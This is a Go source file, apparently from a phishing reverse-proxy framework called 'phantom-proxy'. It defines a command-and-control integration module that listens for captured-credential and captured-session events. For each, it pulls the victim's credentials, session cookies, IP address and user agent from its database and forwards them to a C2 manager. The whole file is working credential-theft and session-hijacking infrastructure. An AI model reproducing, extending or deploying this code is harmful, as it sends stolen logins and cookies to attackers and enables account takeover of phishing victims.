package modules

import (
	"context"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/c2"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/events"
	"go.uber.org/zap"
)

// C2IntegrationModule subscribes to credential events and forwards to C2
type C2IntegrationModule struct {
	manager *c2.Manager
	db      *database.Database
	logger  *zap.Logger
	bus     *events.Bus
}

// NewC2IntegrationModule creates C2 integration module
func NewC2IntegrationModule(manager *c2.Manager, db *database.Database, logger *zap.Logger) *C2IntegrationModule {
	return &C2IntegrationModule{
		manager: manager,
		db:      db,
		logger:  logger,
	}
}

// Name returns module name
func (m *C2IntegrationModule) Name() string { return "c2_integration" }

// Init subscribes to events
func (m *C2IntegrationModule) Init(ctx context.Context, bus *events.Bus) error {
	m.bus = bus
	bus.Subscribe(events.EventCredentialCaptured, m.handleCredentialCaptured)
	bus.Subscribe(events.EventSessionCaptured, m.handleSessionCaptured)
	m.logger.Info("C2 integration module initialized")
	return nil
}

// Shutdown stops module
func (m *C2IntegrationModule) Shutdown(ctx context.Context) error {
	return nil
}

func (m *C2IntegrationModule) handleCredentialCaptured(ctx context.Context, eventType string, payload events.EventPayload) error {
	ev, ok := payload.(*events.CredentialEvent)
	if !ok {
		return nil
	}
	creds, err := m.db.GetCredentials(ev.SessionID)
	if err != nil || creds == nil {
		return nil
	}
	metadata := map[string]string{
		"phishlet":  ev.PhishletID,
		"victim_ip": ev.VictimIP,
		"timestamp": time.Now().Format(time.RFC3339),
	}
	errs := make([]error, 0)
	if err := m.manager.SendCredentials(ctx, creds, metadata); err != nil {
		errs = append(errs, err)
	}
	for _, e := range errs {
		m.logger.Warn("C2 send credentials error", zap.Error(e))
	}
	return nil
}

func (m *C2IntegrationModule) handleSessionCaptured(ctx context.Context, eventType string, payload events.EventPayload) error {
	ev, ok := payload.(*events.SessionEvent)
	if !ok {
		return nil
	}
	session, err := m.db.GetSession(ev.SessionID)
	if err != nil {
		return nil
	}
	creds, _ := m.db.GetCredentials(ev.SessionID)
	cookies, _ := m.db.GetCookiesBySession(ev.SessionID)
	data := &c2.SessionData{
		SessionID:   session.ID,
		VictimIP:    session.VictimIP,
		Credentials: creds,
		Cookies:     cookies,
		PhishletID:  session.PhishletID,
		UserAgent:   session.UserAgent,
	}
	errs := make([]error, 0)
	if err := m.manager.SendSession(ctx, data); err != nil {
		errs = append(errs, err)
	}
	for _, e := range errs {
		m.logger.Warn("C2 send session error", zap.Error(e))
	}
	return nil
}
